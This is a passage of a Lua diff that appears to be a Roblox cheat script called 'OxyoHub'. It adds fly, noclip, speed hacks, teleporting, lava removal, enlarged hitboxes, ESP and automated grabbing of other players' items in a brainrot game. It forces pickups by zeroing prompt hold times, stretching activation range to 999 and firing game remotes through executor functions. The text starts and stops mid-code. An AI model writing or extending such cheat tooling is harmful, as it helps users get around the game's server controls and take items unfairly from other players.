+    LoadingSubtitle = "by Mohammad",
+    ConfigurationSaving = {
+        Enabled    = true,
+        FolderName = "OxyoHub",
+        FileName   = "oxyoHub_v6",
+    },
+    Discord = {
+        Enabled       = false,
+        Invite        = "noinvitelink",
+        RememberJoins = true,
+    },
+    KeySystem = false,
+})
+local player = Players.LocalPlayer
+local character, humanoid, rootPart
+character = player.Character or player.CharacterAdded:Wait()
+humanoid  = character:WaitForChild("Humanoid")
+rootPart  = character:WaitForChild("HumanoidRootPart")
+local function getGameSpeed()
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    return hum and hum.WalkSpeed or 16
+end
+local function getGameJump()
+    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    return hum and hum.JumpPower or 50
+end
+local _cache = { GF=nil, Brainrots=nil, Plots=nil, LuckyBlocks=nil, CoinsFolder=nil }
+local S = {
+    flyEnabled=false, noclipEnabled=false, infinityJumpEnabled=false,
+    currentSpeed=16, currentJumpPower=50, speedEnabled=false, jumpEnabled=false,
+    originalSpeed=nil, originalJump=nil,
+    nowe=false, speeds=1, tpwalking=false, upHeld=false, downHeld=false,
+    instantGrabEnabled=false, instantGrabConnection=nil,
+    OriginalHoldTimes={},
+    collectorRunning=false, collectorThread=nil,
+    selectedRarities={}, selectedMutations={}, selectedTraits={},
+    grabLock=false, grabLockTime=0,
+    maxCarry=1, farmByNameFilter="",
+    autoNameEnabled=false, autoNameThread=nil,
+    lavaRemoved=false, traitData={}, monitorThread=nil,
+    autoCoinEnabled=false, autoHopCoinEnabled=false,
+    autoHopGodlyEnabled=false, autoHopGodlyThread=nil,
+    autoHopCelEnabled=false, autoHopCelThread=nil,
+    coinEventDuration=60, collectedCount=0, countConn=nil,
+    hitboxEnabled=false, hitboxSize=50, hitboxTransp=0.7,
+    hitboxColor=BrickColor.new("Really blue"),
+    volcanoEnabled=false, volcanoThread=nil,
+    fullBrightEnabled=false, infiniteZoomEnabled=false,
+    playerESPEnabled=false, espConnections={},
+    celestialESPEnabled=false, celestialESPConnection=nil,
+    selectedGear=nil, selectedGears={}, selectedLBs={},
+    mutationAlertDropdown={},
+    autoFragmentEnabled=false, autoFragmentConn=nil,
+    autoHopFragEnabled=false, autoHopFragThread=nil,
+    autoHopAquaEnabled=false, autoHopAquaThread=nil,
+    preventAutoLava=false,
+    antiBatEnabled=false, batStunConn=nil, batRemote=nil,
+    godlyESPEnabled=false, godlyESPConn=nil,
+    fullESPEnabled=false, fullESPConn=nil,
+}
+
+local _aquaRunning    = false
+local _aquaThread     = nil
+local _isAquaActive      = function() return false end
+local _getAquaRemotes    = function() return false end
+local _startAquaLoop     = function() end
+local _stopAquaLoop      = function() end
+local _getAquaQueuedTime = function() return nil end
+local function getGF()
+    if _cache.GF and _cache.GF.Parent then return _cache.GF end
+    _cache.GF = workspace:FindFirstChild("GameFolder")
+    return _cache.GF
+end
+local function getBrainrotsFolder()
+    if _cache.Brainrots and _cache.Brainrots.Parent then return _cache.Brainrots end
+    local gf = getGF()
+    _cache.Brainrots = gf and gf:FindFirstChild("Brainrots")
+    return _cache.Brainrots
+end
+local function getPlotsFolder()
+    if _cache.Plots and _cache.Plots.Parent then return _cache.Plots end
+    local gf = getGF()
+    _cache.Plots = gf and gf:FindFirstChild("Plots")
+    return _cache.Plots
+end
+local ALL_RARITIES = {"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly","Forbidden"}
+local ALL_TRAITS   = {"MoonGlow","Magma","Storm","Slime","Volcano","Shamrock","Ice","Forbidden","Arid","Dream","Fiesta"}
+local RARITY_ORDER = {Godly=1,Celestial=2,Secret=3,Mythic=4,Legendary=5,Epic=6,Rare=7,Common=8}
+local monitorData = {
+    brainrots  = {},
+    mutations  = {},
+    totalCount = 0,
+    lastScan   = 0,
+    isRunning  = false,
+}
+local auto = {
+    meteorEnabled  = false, meteorThread   = nil,
+    luckyEnabled   = false, luckyConn      = nil, luckyType     = "All", luckyTraits = {},
+    spinEnabled    = false, spinThread     = nil,
+    moneyEnabled   = false, moneyThread    = nil,
+    upgradeEnabled = false, upgradeThread  = nil,
+    sellEnabled    = false, sellThread     = nil, sellThreshold = 50, sellTimer = 0,
+    buyEnabled     = false, buyThread      = nil,
+    buyLBEnabled   = false, buyLBThread    = nil,
+    alertEnabled   = false, alertThread    = nil,
+    rebirthEnabled = false, rebirthThread  = nil,
+}
+local GEAR_REGISTRY = {
+    GrappleHook      = { displayName = "Grapple Hook",             coinPrice = 75,  serverKey = "GrappleHook"           },
+    LavaBoots        = { displayName = "Lava Boots",               coinPrice = 125, serverKey = "Lava Boots"            },
+    StopLava         = { displayName = "Stop Lava",                coinPrice = 250, serverKey = "Stop Lava"             },
+    MagicCarpet      = { displayName = "Magic Carpet",             coinPrice = 475, serverKey = "MagicCarpet"           },
+    LevelPotion      = { displayName = "Level Potion",             coinPrice = 550, serverKey = "Level Potion"          },
+    PlungeGrapple    = { displayName = "Plunge Grapple",           coinPrice = 0,   serverKey = "PlungeGrapple"         },
+    SubspaceTripmine = { displayName = "Subspace Tripmine",        coinPrice = 0,   serverKey = "SubspaceTripmine"      },
+    Hammer           = { displayName = "Hammer",                   coinPrice = 0,   serverKey = "Hammer"                },
+    SpikedBat        = { displayName = "Spiked Bat",               coinPrice = 0,   serverKey = "SpikedBat"             },
+    Taser            = { displayName = "Taser",                    coinPrice = 0,   serverKey = "Taser"                 },
+    Slapper          = { displayName = "Slapper",                  coinPrice = 0,   serverKey = "Slapper"               },
+    DiscoBomb        = { displayName = "Disco Bomb",               coinPrice = 0,   serverKey = "DiscoBomb"             },
+    Sledgehammer     = { displayName = "Sledgehammer",             coinPrice = 0,   serverKey = "Sledgehammer"          },
+    HyperlaserGun    = { displayName = "Hyperlaser Gun",           coinPrice = 0,   serverKey = "HyperlaserGun"         },
+    RocketLauncher   = { displayName = "Rocket Launcher",          coinPrice = 0,   serverKey = "RocketLauncher"        },
+    BananaPeel       = { displayName = "Banana Peel",              coinPrice = 0,   serverKey = "BananaPeel"            },
+    ChickenGear      = { displayName = "Chicken Friend",           coinPrice = 0,   serverKey = "ChickenGear"           },
+    Drums            = { displayName = "Drums",                    coinPrice = 0,   serverKey = "Drums"                 },
+    Harmonica        = { displayName = "Harmonica",                coinPrice = 0,   serverKey = "Harmonica"             },
+    Trumpet          = { displayName = "Trumpet",                  coinPrice = 0,   serverKey = "Trumpet"               },
+    Trombone         = { displayName = "Trombone",                 coinPrice = 0,   serverKey = "Trombone"              },
+    Violin           = { displayName = "Violin",                   coinPrice = 0,   serverKey = "Violin"                },
+
+    Glider           = { displayName = "Glider",                   coinPrice = 0,   serverKey = "Glider",               serverKeyVariants = {"Glider","GliderGear","Glider Gear","GliderTool","Glider Tool"} },
+    LB_Common        = { displayName = "Common Lucky Block",       coinPrice = 0,   serverKey = "Common Lucky Block (World)"    },
+    LB_Rare          = { displayName = "Rare Lucky Block",         coinPrice = 0,   serverKey = "Rare Lucky Block (World)"      },
+    LB_Epic          = { displayName = "Epic Lucky Block",         coinPrice = 0,   serverKey = "Epic Lucky Block (World)"      },
+    LB_Legendary     = { displayName = "Legendary Lucky Block",    coinPrice = 0,   serverKey = "Legendary Lucky Block (World)" },
+    LB_Mythic        = { displayName = "Mythic Lucky Block",       coinPrice = 0,   serverKey = "Mythic Lucky Block (World)"    },
+    LB_Secret        = { displayName = "Secret Lucky Block",       coinPrice = 0,   serverKey = "Secret Lucky Block (World)"    },
+    LB_Celestial     = { displayName = "Celestial Lucky Block",    coinPrice = 0,   serverKey = "Celestial Lucky Block (World)" },
+    LB_Godly         = { displayName = "Godly Lucky Block",        coinPrice = 0,   serverKey = "Godly Lucky Block (World)"     },
+    LB_Magma         = { displayName = "Magma Lucky Block",        coinPrice = 0,   serverKey = "Magma Lucky Block"     },
+    LB_Food          = { displayName = "Food Lucky Block",         coinPrice = 0,   serverKey = "Food Lucky Block"      },
+    LB_Dino          = { displayName = "Dino Lucky Block",         coinPrice = 0,   serverKey = "Dino Lucky Block"      },
+    LB_Aqua          = { displayName = "Aqua Lucky Block",         coinPrice = 0,   serverKey = "Aqua Lucky Block"      },
+    LB_MoonMagma     = { displayName = "Moon Magma Lucky Block",   coinPrice = 0,   serverKey = "Moon Magma Lucky Block"},
+    LB_MoonCelestial = { displayName = "Moon Celestial Lucky Block",coinPrice = 0,  serverKey = "Moon Celestial Lucky Block"},
+    LB_MoonSecret    = { displayName = "Moon Secret Lucky Block",  coinPrice = 0,   serverKey = "Moon Secret Lucky Block"},
+    LB_MoonMythic    = { displayName = "Moon Mythic Lucky Block",  coinPrice = 0,   serverKey = "Moon Mythic Lucky Block"},
+    LB_Dream         = { displayName = "Dream Lucky Block",         coinPrice = 0,  serverKey = "Dream Lucky Block (World)",         serverKeyVariants = {"Dream Lucky Block (World)","Dream Lucky Block","DreamLuckyBlock"} },
+    LB_PremDream     = { displayName = "Premium Dream Lucky Block", coinPrice = 0,  serverKey = "Premium Dream Lucky Block (World)", serverKeyVariants = {"Premium Dream Lucky Block (World)","Premium Dream Lucky Block","PremiumDreamLuckyBlock"} },
+}
+local LUCKY_TYPES = {
+    "Common Lucky Block","Rare Lucky Block","Epic Lucky Block",
+    "Legendary Lucky Block","Mythic Lucky Block","Celestial Lucky Block",
+    "Secret Lucky Block","Godly Lucky Block","Magma Lucky Block",
+    "Food Lucky Block","Moon Magma Lucky Block","Moon Celestial Lucky Block",
+    "Moon Secret Lucky Block","Moon Mythic Lucky Block",
+    "Dino Lucky Block",
+    "Dream Lucky Block","Premium Dream Lucky Block",
+}
+local ALERT_MUTATIONS       = {"Gold","Emerald","Diamond","Bloodmoon","Rainbow","Aqua"}
+local MainTab, CollectorTab, BrainrotListTab, BrainrotStatusTab, LuckyStatusTab,
+      GearTab, HopTab, ForbiddenTab, BrainrotFinderTab,
+      ZonesTab, HitboxTab, ExtraTab, DreamsTab, AquaTab
+MainTab           = Window:CreateTab("Main",               4483362458)
+CollectorTab      = Window:CreateTab("Auto",               4483362458)
+BrainrotListTab   = Window:CreateTab("Brainrot List",      4483362458)
+BrainrotStatusTab = Window:CreateTab("Brainrot Status",    4483362458)
+LuckyStatusTab    = Window:CreateTab("Lucky Block Status", 4483362458)
+GearTab           = Window:CreateTab("Shop",               4483362458)
+HopTab            = Window:CreateTab("Hop",                4483362458)
+ForbiddenTab      = Window:CreateTab("🚫 Forbidden",       4483362458)
+BrainrotFinderTab = Window:CreateTab("🎯 Finder",          4483362458)
+ZonesTab          = Window:CreateTab("Zones",              4483362458)
+HitboxTab         = Window:CreateTab("Hitbox",             4483362458)
+DreamsTab         = Window:CreateTab("💜 Dreams",          4483362458)
+AquaTab           = Window:CreateTab("🎣 Aqua",            4483362458)
+ExtraTab          = Window:CreateTab("Extra",              4483362458)
+local function walkForward(studs, timeout)
+    studs   = studs   or 5
+    timeout = timeout or 3
+    local hum  = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then return end
+    local look   = root.CFrame.LookVector
+    local target = root.Position + Vector3.new(look.X, 0, look.Z).Unit * studs
+    hum:MoveTo(target)
+    local deadline = tick() + timeout
+    repeat RunService.Heartbeat:Wait() until (root.Position - target).Magnitude < 1.5 or tick() > deadline
+    pcall(function() hum:MoveTo(root.Position) end)
+end
+local function safeTeleport(targetCFrame)
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    local dist = (targetCFrame.Position - root.Position).Magnitude
+    if dist > 1000 then
+        local steps = math.ceil(dist / 500)
+        for i = 1, steps - 1 do
+            local alpha = i / steps
+            local mid = CFrame.new(root.Position:Lerp(targetCFrame.Position, alpha)) + Vector3.new(0, 5, 0)
+            pcall(function() root.CFrame = mid end)
+            task.wait(0.1)
+            root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if not root then return false end
+        end
+    elseif dist > 500 then
+        local mid = CFrame.new(root.Position:Lerp(targetCFrame.Position, 0.5)) + Vector3.new(0, 5, 0)
+        pcall(function() root.CFrame = mid end)
+        task.wait(0.08)
+    end
+    pcall(function() root.CFrame = targetCFrame end)
+    return true
+end
+local _cachedMyPlot = nil
+local function getPlayerPlot()
+    if _cachedMyPlot and _cachedMyPlot.Parent then
+        return _cachedMyPlot
+    end
+    local gf = workspace:FindFirstChild("GameFolder")
+    local plots = gf and gf:FindFirstChild("Plots")
+    if not plots then return _cachedMyPlot end
+    for _, plotModel in pairs(plots:GetChildren()) do
+        local brainrots = plotModel:FindFirstChild("Brainrots")
+        if not brainrots then continue end
+        for _, br in pairs(brainrots:GetChildren()) do
+            local ok, ownerVal = pcall(function() return br:GetAttribute("Owner") end)
+            if ok and ownerVal and tostring(ownerVal) == tostring(player.UserId) then
+                _cachedMyPlot = plotModel
+                return plotModel
+            end
+        end
+    end
+    return _cachedMyPlot
+end
+local function teleportToMyPlot()
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    local plotModel = getPlayerPlot()
+    if not plotModel then return false end
+    local att  = plotModel:FindFirstChild("YourBaseAtt")
+    local base = plotModel:FindFirstChild("Base")
+    local pos  = nil
+    if att then
+        pos = att.WorldPosition + Vector3.new(0, 6, 0)
+    elseif base then
+        local bp = (base:IsA("Model") and (base.PrimaryPart or base:FindFirstChildWhichIsA("BasePart")))
+                 or (base:IsA("BasePart") and base)
+        if bp then pos = bp.Position + Vector3.new(0, 6, 0) end
+    end
+    if pos then safeTeleport(CFrame.new(pos)) return true, plotModel end
+    return false
+end
+local function isFishingLava(obj)
+    local cur = obj.Parent
+    while cur and cur ~= workspace and cur ~= game do
+        if cur.Name == "AquaEvent" or cur.Name == "AquaMap" then
+            return true
+        end
+        cur = cur.Parent
+    end
+    return false
+end
+local _hideLavaConn = nil
+local function hideLava()
+    if S.preventAutoLava then return end
+    task.defer(function()
+        pcall(function()
+            if Rayfield and Rayfield.Flags and Rayfield.Flags["RemoveLava"] then
+                if not Rayfield.Flags["RemoveLava"].CurrentValue then
+                    Rayfield.Flags["RemoveLava"]:Set(true)
+                end
+            end
+        end)
+    end)
+    if S.lavaRemoved then return end
+    S.lavaRemoved = true
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if (v.Name == "Lavas" or v.Name == "Lava") and not isFishingLava(v) then
+            pcall(function()
+                if v:IsA("BasePart") then
+                    v.Transparency = 1
+                    v.CanCollide   = false
+                end
+            end)
+        end
+    end
+    if _hideLavaConn then _hideLavaConn:Disconnect() end
+    _hideLavaConn = workspace.DescendantAdded:Connect(function(obj)
+        if (obj.Name == "Lavas" or obj.Name == "Lava") and not isFishingLava(obj) then
+            pcall(function()
+                if obj:IsA("BasePart") then
+                    obj.Transparency = 1
+                    obj.CanCollide   = false
+                end
+            end)
+        end
+    end)
+end
+local restoreLava = function()
+    if S.lavaRemoved and not S.autoFarmEnabled and not S.autoHopCoinEnabled
+        and not S.autoHopGodlyEnabled and not S.autoHopCelEnabled and not S.autoHopFragEnabled then
+        if _hideLavaConn then _hideLavaConn:Disconnect() _hideLavaConn = nil end
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if (v.Name == "Lavas" or v.Name == "Lava") and not isFishingLava(v) then
+                pcall(function()
+                    if v:IsA("BasePart") then
+                        v.Transparency = 0
+                        v.CanCollide   = true
+                    end
+                end)
+            end
+        end
+        S.lavaRemoved = false
+    end
+end
+local _eventWatcherSent, GREEN_LINE_POS = {}, Vector3.new(-33.360527, 4.259904, -54.073788)
+local _etcCached = nil
+
+task.spawn(function()
+    task.wait(1)
+    pcall(function()
+        _etcCached = require(game:GetService("ReplicatedStorage").Modules.EventTimerController)
+    end)
+end)
+task.spawn(function()
+    task.wait(5)
+    while true do
+        task.wait(8)
+        pcall(function()
+            if not _etcCached then
+                _etcCached = require(game:GetService("ReplicatedStorage").Modules.EventTimerController)
+            end
+            local etc = _etcCached
+            if not etc or not etc.OnGoingTimers then return end
+            local function stripTags(s)
+                return tostring(s):gsub("<[^>]+>", ""):gsub("&lt;", "<"):gsub("&gt;", ">")
+            end
+            for k, timer in pairs(etc.OnGoingTimers) do
+                local ui = timer.UI
+                if typeof(ui) ~= "Instance" then continue end
+                local timeLeft = tonumber(timer.TimeRemaining) or 0
+                local name = ""
+                local nl = ui:FindFirstChild("NameLabel")
+                local tl = ui:FindFirstChild("Title")
+                if nl and nl:IsA("TextLabel") then name = stripTags(nl.Text)
+                elseif tl and tl:IsA("TextLabel") then name = stripTags(tl.Text) end
+                if name == "" then continue end
+                local key = tostring(k) .. "_" .. name
+                if not _eventWatcherSent[key] then
+                    _eventWatcherSent[key] = true
+                    local emoji = "🎉"
+                    local col   = 3066993
+                    if name:lower():find("coin") then emoji = "🪙" col = 16766720
+                    elseif name:lower():find("volcano") then emoji = "🌋" col = 16711680
+                    elseif name:lower():find("aqua")    then emoji = "🌊" col = 0x00BFFF
+                    elseif name:lower():find("patric") or name:lower():find("shamrock") then emoji = "🍀" col = 3066993
+                    elseif name:lower():find("moon")  then emoji = "🌙" col = 9699539
+                    elseif name:lower():find("slime")  then emoji = "🟢" col = 3394764
+                    elseif name:lower():find("dream")  then emoji = "💜" col = 0x9B59B6
+                    end
+                    sendWebhook(
+                        emoji .. " Event Started: " .. name,
+                        "Time Remaining: `" .. math.floor(timeLeft) .. "s`",
+                        col
+                    )
+                end
+            end
+            local activeKeys = {}
+            for k, timer in pairs(etc.OnGoingTimers) do
+                local ui = timer.UI
+                if typeof(ui) ~= "Instance" then continue end
+                local nl = ui:FindFirstChild("NameLabel")
+                local tl = ui:FindFirstChild("Title")
+                local name = (nl and nl.Text) or (tl and tl.Text) or ""
+                activeKeys[tostring(k) .. "_" .. name] = true
+            end
+            for key in pairs(_eventWatcherSent) do
+                if not activeKeys[key] then _eventWatcherSent[key] = nil end
+            end
+        end)
+    end
+end)
+local function getCoinRainStatus()
+    if workspace:GetAttribute("CoinRain") == true then
+        return "active", 60
+    end
+    local ok, etc = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.EventTimerController)
+    end)
+    if not ok or not etc or not etc.OnGoingTimers then return nil end
+    for _, timer in pairs(etc.OnGoingTimers) do
+        local timeLeft = tonumber(timer.TimeRemaining) or 0
+        if timer.RealName == "CoinRain" then
+            return "active", timeLeft
+        end
+        local ui = timer.UI
+        if typeof(ui) == "Instance" then
+            local nl = ui:FindFirstChild("NameLabel")
+            if nl and nl:IsA("TextLabel") then
+                local txt = nl.Text:gsub("<[^>]+>", "")
+                if txt:find("Coin Rain") then
+                    return "active", timeLeft
+                end
+            end
+        end
+    end
+    return nil
+end
+local function _detectCoinRainFallback()
+    if workspace:GetAttribute("CoinRain") == true then return "active", 60 end
+    local ok, tagged = pcall(function()
+        return game:GetService("CollectionService"):GetTagged("COLLECTABLE_COIN")
+    end)
+    if ok and tagged and #tagged >= 1 then return "active", 60 end
+    local coins = {}
+    if _liveCoinParts then
+        for part in pairs(_liveCoinParts) do
+            if part and part.Parent then table.insert(coins, part) end
+        end
+    end
+    if #coins >= 1 then return "active", 60 end
+    return nil
+end
+
+local function _getCoinRainQueuedTime()
+
+    local ok2, result2 = pcall(function()
+        if not _etcCached then
+            _etcCached = require(game:GetService("ReplicatedStorage").Modules.EventTimerController)
+        end
+        local etc = _etcCached
+        if not etc or not etc.OnGoingTimers then return nil end
+        for _, timer in pairs(etc.OnGoingTimers) do
+            local rn   = tostring(timer.RealName or ""):lower()
+            local trem = tonumber(timer.TimeRemaining) or 0
+            local ui   = timer.UI
+            local name = ""
+            if typeof(ui) == "Instance" then
+                local nl = ui:FindFirstChild("NameLabel")
+                if nl and nl:IsA("TextLabel") then name = nl.Text:lower() end
+            end
+
+            if (rn:find("coin") or name:find("coin")) and trem >= 0 then
+                local isActive = false
+                pcall(function()
+                    local json2 = workspace:GetAttribute("ActiveEvents")
+                    if json2 and json2 ~= "" then
+                        local d2 = game:GetService("HttpService"):JSONDecode(json2)
+                        for k2 in pairs(d2) do
+                            if tostring(k2):lower():find("coin") then isActive = true end
+                        end
+                    end
+                end)
+
+                if not isActive then return math.max(trem, 5) end
+            end
+        end
+        return nil
+    end)
+    if ok2 and result2 then return result2 end
+
+    local ok, result = pcall(function()
+        local json = workspace:GetAttribute("QueuedEvents")
+        if not json or json == "" then return nil end
+        local d = game:GetService("HttpService"):JSONDecode(json)
+        for key, entry in pairs(d) do
+            if tostring(key):lower():find("coin", 1, true) then
+                local t = tonumber(type(entry) == "table" and entry.EventTime) or 0
+                if t > 0 then return math.min(t, 1200) end
+            end
+        end
+        return nil
+    end)
+    return ok and result or nil
+end
+local function waitForCoinRainStatus(timeout)
+    local deadline = tick() + (timeout or 15)
+    while tick() < deadline do
+        if getgenv().OxyoAutoHopCoin and getgenv().OxyoHopStopped then return nil end
+        local s, t = getCoinRainStatus()
+        if s then return s, t end
+        local s2, t2 = _detectCoinRainFallback()
+        if s2 then return s2, t2 end
+        task.wait(1)
+    end
+    return nil
+end
+local _rarityFolderCache = {}
+local function getBrainrotFolder(rarity)
+    if rarity == "Godly" then
+        local br = workspace:FindFirstChild("Brainrots")
+        local f  = br and br:FindFirstChild("Godly")
+        if f then return f end
+    end
+    local cached = _rarityFolderCache[rarity]
+    if cached and cached.Parent then return cached end
+    local gf = getGF()
+    if not gf then return nil end
+    local br = gf:FindFirstChild("Brainrots")
+    local folder = br and br:FindFirstChild(rarity)
+    if folder then _rarityFolderCache[rarity] = folder end
+    return folder
+end
+local SUBMIT_ZONE_HINT, _cachedSubmitPart = Vector3.new(-30.419689, 4.307883, -54.771233), nil
+local function findSubmitZone()
+    if _cachedSubmitPart and _cachedSubmitPart.Parent then
+        return _cachedSubmitPart.CFrame + Vector3.new(0, 3, 0)
+    end
+    _cachedSubmitPart = nil
+    local gf = getGF()
+    if gf then
+        for _, d in pairs(gf:GetDescendants()) do
+            if d:IsA("BasePart") and (d.Position - SUBMIT_ZONE_HINT).Magnitude < 12 then
+                _cachedSubmitPart = d
+                return d.CFrame + Vector3.new(0, 3, 0)
+            end
+        end
+    end
+    for _, d in pairs(workspace:GetDescendants()) do
+        if d:IsA("BasePart") and (d.Position - SUBMIT_ZONE_HINT).Magnitude < 12 then
+            _cachedSubmitPart = d
+            return d.CFrame + Vector3.new(0, 3, 0)
+        end
+    end
+    return CFrame.new(SUBMIT_ZONE_HINT + Vector3.new(0, 3, 0))
+end
+local function getSafeBase()
+    local spawn = workspace:FindFirstChildWhichIsA("SpawnLocation")
+    if spawn then return CFrame.new(spawn.Position + Vector3.new(0, 5, 0)) end
+    return CFrame.new(SUBMIT_ZONE_HINT + Vector3.new(5, 3, 0))
+end
+local function equipBest()
+    pcall(function()
+        local ev = game:GetService("ReplicatedStorage"):FindFirstChild("Events")
+        local remote = ev and ev:FindFirstChild("EquipBest")
+        if remote then remote:FireServer() end
+    end)
+end
+local function submitAndPlace()
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then task.wait(0.5) return end
+    local submitPos = findSubmitZone().Position
+    root.CFrame = CFrame.new(submitPos + Vector3.new(0, 0, -3))
+    task.wait(0.2)
+    root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    root.CFrame = CFrame.new(submitPos + Vector3.new(0, 0, 5))
+    task.wait(0.3)
+    root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    local plotModel = getPlayerPlot() or _cachedMyPlot
+    if root and plotModel and plotModel.Parent then
+        local att = plotModel:FindFirstChild("YourBaseAtt")
+        if att then
+            root.CFrame = CFrame.new(att.WorldPosition + Vector3.new(0, 3, 0))
+            task.wait(0.3)
+        end
+    end
+end
+local function passesFarmFilters(obj)
+    if #S.selectedMutations > 0 then
+        local mutation = obj:GetAttribute("Mutation") or "Normal"
+        local ok = false
+        for _, m in ipairs(S.selectedMutations) do
+            if mutation == m then ok = true break end
+        end
+        if not ok then return false end
+    end
+    if #S.selectedTraits > 0 then
+        local td = S.traitData[obj]
+        if not td or #td.traitNames == 0 then return false end
+        local ok = false
+        for _, want in ipairs(S.selectedTraits) do
+            for _, have in ipairs(td.traitNames) do
+                if want == have then ok = true break end
+            end
+            if ok then break end
+        end
+        if not ok then return false end
+    end
+    return true
+end
+local function passesByNameFilter(obj)
+    if S.farmByNameFilter == "" then return false end
+    local displayName = (obj:GetAttribute("DisplayName") or obj.Name):lower()
+    return displayName:find(S.farmByNameFilter:lower(), 1, true) ~= nil
+end
+local function _isBrainrotTaken(obj)
+    if not obj or not obj.Parent then return true end
+    local taken = false
+    pcall(function()
+        local pp = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if pp and (not pp.Enabled or not pp.ActionEnabled) then taken = true return end
+        local oa = obj:GetAttribute("Owner") or obj:GetAttribute("Carrying")
+               or obj:GetAttribute("IsHeld") or obj:GetAttribute("HeldBy")
+               or obj:GetAttribute("PickedUp")
+        if oa and tostring(oa) ~= "" and tostring(oa) ~= "0" then taken = true return end
+        local anc = obj.Parent
+        while anc and anc ~= workspace do
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character == anc then taken = true return end
+            end
+            anc = anc.Parent
+        end
+    end)
+    return taken
+end
+local function _isFragmentTaken(obj)
+    if not obj or not obj.Parent then return true end
+    local taken = false
+    pcall(function()
+        local oa = obj:GetAttribute("Owner") or obj:GetAttribute("Carrying")
+               or obj:GetAttribute("IsHeld") or obj:GetAttribute("HeldBy")
+        if oa and tostring(oa) ~= "" and tostring(oa) ~= "0" then taken = true return end
+        local pp = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if pp and (not pp.Enabled or not pp.ActionEnabled) then taken = true return end
+        local anc = obj.Parent
+        while anc and anc ~= workspace do
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr.Character == anc then taken = true return end
+            end
+            local n = anc.Name
+            if n == "Plots" or n == "Plot" or n == "PlayerPlot"
+            or n == "PlacedItems" or n == "Furniture" or n == "Chair"
+            or n == "FuseMachine" or n == "ForbiddenFuse" or n == "FuseSlot"
+            or n == "BrainrotSlot" or n == "Slot" or n == "InputSlot"
+            or n == "MachinePart" or n == "SubmitArea" or n == "FragmentSlot"
+            or n == "FragmentHolder" or n == "SubmitZone" or n == "Throne"
+            or n == "ThroneSlot" or n == "ForbiddenThrone" then
+                taken = true return
+            end
+            anc = anc.Parent
+        end
+    end)
+    return taken
+end
+local function grabBrainrot(obj)
+    if not obj or not obj.Parent then return false end
+    if _isBrainrotTaken(obj) then return false end
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    local part = obj:FindFirstChildWhichIsA("BasePart") or obj.PrimaryPart
+    if not part then return false end
+    safeTeleport(part.CFrame * CFrame.new(0, 4, 0))
+    task.wait(0.1)
+    pcall(function() root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end)
+    task.wait(0.15)
+    _firetouchinterest(root, part, 0)
+    task.wait(0.05)
+    local prompt = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
+    if prompt then
+        local originalHold = prompt.HoldDuration
+        pcall(function() prompt.HoldDuration = 0 end)
+        pcall(function() prompt.MaxActivationDistance = 999 end)
+        local fired = typeof(fireproximityprompt) == "function" and pcall(fireproximityprompt, prompt)
+        if not fired then
+            fired = pcall(function()
+                game:GetService("ProximityPromptService"):PromptTriggered(prompt, player)
+            end)
+        end
+        if not fired then
+            pcall(function()
+                local ev = ReplicatedStorage:FindFirstChild("Events")
+                local interact = ev and (
+                    ev:FindFirstChild("Interact") or
+                    ev:FindFirstChild("ProximityPrompt") or
+                    ev:FindFirstChild("Trigger") or
+                    ev:FindFirstChild("PickUp") or
+                    ev:FindFirstChild("Collect")
+                )
+                if interact then interact:FireServer(prompt) fired = true end
+            end)
+        end
+        if not fired then
+            for _ = 1, 5 do
+                _firetouchinterest(root, part, 0)
+                task.wait(0.05)
+            end
+        end
+        task.wait(0.05)
+        pcall(function() prompt.HoldDuration = originalHold end)
+        pcall(function() prompt.MaxActivationDistance = 10 end)
+    end
+    task.wait(0.3)
+    return true
+end
+local function pickFromFolder(folder)
+    for _, obj in ipairs(folder:GetChildren()) do
+        if passesFarmFilters(obj) then return obj end
+    end
+    return nil
+end
+local function collectOne(rarity, objOverride)
+    local folder = getBrainrotFolder(rarity)
+    if not folder then return end
+    local obj = objOverride
+    if not obj or not obj.Parent then obj = pickFromFolder(folder) end
+    if not obj or not obj.Parent then return end
+    if grabBrainrot(obj) then
+        pcall(submitAndPlace)
+    end
+end
+local function runRarityHopFarm(rarity, enabledKey, stoppedKey)
+    local _noFolderTries = 0
+    while getgenv()[enabledKey] and not getgenv()[stoppedKey] do
+        local folder = getBrainrotFolder(rarity)
+        if not folder then
+            _noFolderTries = _noFolderTries + 1
+            task.wait(2)
+            if _noFolderTries >= 3 then
+                _noFolderTries = 0
+                if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+                    task.wait(math.random(5, 10))
+                    task.spawn(function() smartHopGeneric(enabledKey, stoppedKey) end)
+                end
+                return
+            end
+            continue
+        end
+        _noFolderTries = 0
+        local objs = {}
+        for _, obj in ipairs(folder:GetChildren()) do
+            if obj and obj.Parent then table.insert(objs, obj) end
+        end
+        if #objs == 0 then
+            if getgenv()[enabledKey] and not getgenv()[stoppedKey] then
+
+                if rarity == "Celestial" then
+                    local celTimer
+                    pcall(function() celTimer = tonumber(workspace:GetAttribute("CelestialTimer")) end)
+                    if celTimer and celTimer > 0 and celTimer <= 60 then
+                        Rayfield:Notify({
+                            Title   = "🌌 Celestial Spawning Soon!",
+                            Content = string.format("CelestialTimer: %ds — waiting for spawn!", math.floor(celTimer)),
+                            Duration = 5, Image = 4483362458,
+                        })
+                        local waited = 0
+                        while waited < celTimer + 15
